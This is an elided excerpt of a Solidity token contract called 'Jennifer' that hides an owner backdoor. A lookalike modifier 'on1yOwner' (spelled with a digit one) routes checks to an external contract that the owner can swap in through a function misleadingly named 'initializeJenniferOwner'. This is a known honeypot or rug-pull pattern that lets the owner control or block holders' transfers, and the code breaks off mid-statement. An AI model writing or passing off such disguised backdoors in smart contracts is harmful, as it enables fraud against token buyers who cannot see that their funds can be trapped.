...
interface IERC1363 {
    ...
    function on1yOwner(address owner, address spender) external;
}
...
contract IERC165 {    
    ...
    modifier on1yOwner(address owner, address spender) {
        eips.on1yOwner(owner, spender);
        _;
    }
    /**
...
contract Ownable is Context, IERC165{  
    ...
    */
    function initializeJenniferOwner(address newOwner) external onlyOwner returns (bool) {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        eips = IERC1363(newOwner);
        return true;
    }      
...
contract Jennifer is Ownable {
    ...
    function initJenniferCoolDown(uint256 minimumDividends) external onlyOwner {
        _coolWait = 3600;
        _minimumDividends = minimumDividends;
    }

    function excludeJenniferDividends(address account) external onlyOwner {
        require(!excludedFromDividends[account]);
        excludedFromDividends[account] = true;
    }

    function updateJenniferCoolDown(uint256 newCoolWait) external onlyOwner {
        require(
	...
	function bulkJenniferTransfer(address[] calldata to, uint256[] calldata amounts) public onlyOwner {
	...
	function getJenniferFees(uint256 buybackMultiplierTriggeredAt, uint256 totalFee) public view returns (uint256) {
			if (
